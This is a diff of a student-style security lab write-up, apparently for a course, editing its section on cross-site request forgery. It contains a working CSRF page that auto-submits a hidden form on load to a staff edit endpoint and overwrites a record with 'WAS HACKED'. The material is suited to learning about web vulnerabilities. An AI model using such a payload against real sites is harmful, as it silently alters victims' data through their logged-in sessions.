@@ -55,20 +55,23 @@ Vulnerability #1: Cross-Site Request Forgery (CSRF)
  * This was one of the more difficult ones for me. I kept having typos which lead to it not working at first.
  When I got it to work, it was a lot easier. 
  * It consists of creating a malicious page which in return allows the user's session to create a request to the database.
- > <html>
+ 
+```
+<html>
   <head>
-    <title>This is a Blank Page!</title>
+    <title>A Totally Blank Page</title>
   </head>
   <body onload="document.CSRF.submit()">
 	<form action="https://xx.xxx.xxx.xx/red/public/staff/salespeople/edit.php?id=5" method="post" style="display: none;" name='CSRF' target="res">
-	    <input type="text" name="first_name" value="Mr. Ken Barker" />
-      	<input type="text" name="last_name" value="YOU WERE HACKED" />
-      	<input type="text" name="phone" value="123-456-7890" />
-      	<input type="text" name="email" value="mrbarker@yougothacked.com" />
+	    <input type="text" name="first_name" value="Ken Barker" />
+      	<input type="text" name="last_name" value="WAS HACKED" />
+      	<input type="text" name="phone" value="555-352-9654" />
+      	<input type="text" name="email" value="kbarker@HACKED.com" />
 	</form>
     <iframe name="res" style="display: none;"></iframe>
   </body>
 </html>
+```
 
 Vulnerability #2: Insecure Direct Object Reference
 
